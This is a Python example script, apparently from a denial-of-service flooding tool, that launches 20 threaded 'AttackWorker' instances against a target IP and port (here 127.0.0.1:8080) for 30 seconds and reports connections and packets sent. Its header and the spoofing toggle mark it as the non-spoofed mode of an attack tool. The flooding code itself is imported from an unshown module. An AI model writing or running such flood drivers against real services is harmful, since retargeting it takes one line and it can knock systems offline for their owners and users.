#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Example 1: Basic Attack (Without IP Spoofing)
"""

import sys
sys.path.insert(0, '..')

from src import AttackWorker, AttackStatistics, Colors, setup_logging
import threading
import time

def main():
    print(f"{Colors.OKGREEN}[Example] Basic Attack - No IP Spoofing{Colors.ENDC}\n")
    
    # Configuration
    target_ip = "127.0.0.1"
    target_port = 8080
    threads_count = 20
    
    print(f"Target: {target_ip}:{target_port}")
    print(f"Threads: {threads_count}")
    print(f"Spoofing: DISABLED\n")
    
    # Setup
    setup_logging()
    stats = AttackStatistics()
    
    # Start workers
    workers = []
    for i in range(threads_count):
        worker = AttackWorker(
            target_ip, 
            target_port, 
            stats, 
            worker_id=i, 
            use_spoofing=False  # No spoofing
        )
        thread = threading.Thread(target=worker.run, daemon=True)
        thread.start()
        workers.append(worker)
    
    # Run for 30 seconds
    try:
        print("Running for 30 seconds... Press Ctrl+C to stop early\n")
        time.sleep(30)
    except KeyboardInterrupt:
        pass
    
    # Stop
    for worker in workers:
        worker.stop()
    
    time.sleep(1)
    
    # Show stats
    final_stats = stats.get_stats()
    print(f"\n{Colors.OKBLUE}{'='*60}")
    print(f"{'FINAL STATS':^60}")
    print(f"{'='*60}{Colors.ENDC}")
    print(f"Connections: {final_stats['connections_established']}")
    print(f"Success Rate: {final_stats['success_rate']:.2f}%")
    print(f"Packets Sent: {final_stats['total_packets']}\n")

if __name__ == "__main__":
    main()
